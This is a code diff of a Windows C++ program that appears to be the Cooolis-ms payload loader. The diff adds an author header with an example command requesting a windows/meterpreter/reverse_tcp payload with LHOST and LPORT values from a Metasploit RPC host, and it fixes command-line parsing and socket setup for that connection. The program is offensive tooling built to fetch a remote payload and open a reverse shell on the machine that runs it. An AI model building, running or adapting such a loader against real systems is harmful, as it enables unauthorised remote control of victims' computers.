@@ -1,3 +1,10 @@
+/**************************
+Code By Rvn0xsy
+https://payloads.online
+Email:rvn0xsy@gmail.com
+Commandline e.g.>Cooolis-ms-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.164.136,LPORT=8866 -H 192.168.164.136 -P 8899
+***************************/
+
 #include <WinSock2.h>
 #include <iostream>
 #include <Windows.h>
@@ -58,7 +65,7 @@ int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance, 
 		return 0;
 	}
 
-	LPWSTR* szArgList = NULL; // 参数列表
+	PWCHAR * szArgList = NULL; // 参数列表
 	int argCount = NULL; // 参数个数
 	DWORD port = NULL; // RPC 端口
 	PWCHAR ip = NULL; // RPC IP
@@ -80,10 +87,11 @@ int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance, 
 		// 解析参数
 		PWCHAR pstrPayload = NULL;
 		PWCHAR pstrOptions = NULL;
-
+		szArgList = CommandLineToArgvW(GetCommandLine(),&argCount);
 		// 如果参数小于9个，则退出
 		if (szArgList == NULL || argCount < 9)
 		{
+
 			Usage();
 			ExitProcess(0);
 		}
@@ -92,13 +100,16 @@ int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance, 
 		{
 			if (lstrcmpW(szArgList[i], TEXT("-p")) == 0) {
 				pstrPayload = szArgList[++i];
+				
 				char* cPay = UnicodeToAnsi(pstrPayload);
 
 				CopyMemory(sd.payload, cPay, strlen(cPay));
 			}
 			else if (lstrcmpW(szArgList[i], TEXT("-s")) == 0)
 			{
+
 				pstrOptions = szArgList[++i];
+				
 				char* opt = UnicodeToAnsi(pstrOptions);
 				CopyMemory(sd.options, opt, strlen(opt));
 
@@ -106,15 +117,19 @@ int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance, 
 			else if (lstrcmpW(szArgList[i], TEXT("-H")) == 0)
 			{
 				ip = szArgList[++i];
+				
 			}
 			else if (lstrcmpW(szArgList[i], TEXT("-P")) == 0)
 			{
-				port = _wtoi(szArgList[++i]);
+				PWCHAR wport = szArgList[++i];
+				
+				port = _wtoi(wport);
 			}
 			else {
 				Usage();
 			}
 	}
+
 	InetPtonW(AF_INET, ip, &(sock_addr.sin_addr)); // 转换IP地址
 	sock_addr.sin_family = AF_INET;		// 套接字类型
 	sock_addr.sin_port = htons(port);  // 套接字端口
